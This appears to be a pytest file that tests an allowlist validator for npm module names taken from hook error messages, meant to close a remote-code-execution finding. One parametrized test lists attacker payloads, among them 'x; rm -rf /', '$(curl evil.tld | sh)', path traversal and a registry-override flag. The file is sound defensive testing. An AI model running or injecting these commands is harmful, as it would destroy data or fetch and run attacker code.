"""PROP-A-hook-allowlist (required:true, Tier 0) — npm install allowlist, anti-RCE.

Spec: behavioral-spec.md REQ-A5 + `_shared/hook-modules-allowlist.txt`.
Closes FIND-004 critical RCE under launchd.
"""
import pytest

from lib.healthcheck import extract_hook_module_name  # FAIL until 2b


ALLOWLIST = ["dotenv", "@anthropic-ai/claude-code-hooks", "zx", "execa"]


def test_valid_allowlisted_module_extracted():
    pane = (
        "PreToolUse:Bash hook error  node:internal/modules/cjs/loader:1458\n"
        "Cannot find module 'dotenv'\n"
    )
    result = extract_hook_module_name(pane, ALLOWLIST)
    assert result["name"] == "dotenv"
    assert result["valid"] is True
    assert result["allowlisted"] is True


def test_unrecognized_but_validly_named_module_is_not_allowlisted():
    pane = "Cannot find module 'pwn-anicca'"
    result = extract_hook_module_name(pane, ALLOWLIST)
    assert result["name"] == "pwn-anicca"
    assert result["valid"] is True       # valid npm name regex
    assert result["allowlisted"] is False  # but NOT allowlisted → escalation path


@pytest.mark.parametrize(
    "evil",
    [
        # path traversal
        "../../../bin/sh",
        # CLI flag injection
        "--registry=http://evil/",
        # shell metachars
        "x; rm -rf /",
        "$(curl evil.tld | sh)",
        "`whoami`",
        # null byte
        "real\x00../evil",
        # URL as "module"
        "http://evil.tld/payload.tgz",
    ],
)
def test_rejects_attacker_payloads(evil):
    pane = f"Cannot find module '{evil}'"
    result = extract_hook_module_name(pane, ALLOWLIST)
    assert result["valid"] is False, f"{evil} should fail validation"
    assert result["allowlisted"] is False


def test_no_module_in_pane_returns_none_name():
    pane = "Some unrelated error message with no module reference"
    result = extract_hook_module_name(pane, ALLOWLIST)
    assert result["name"] is None
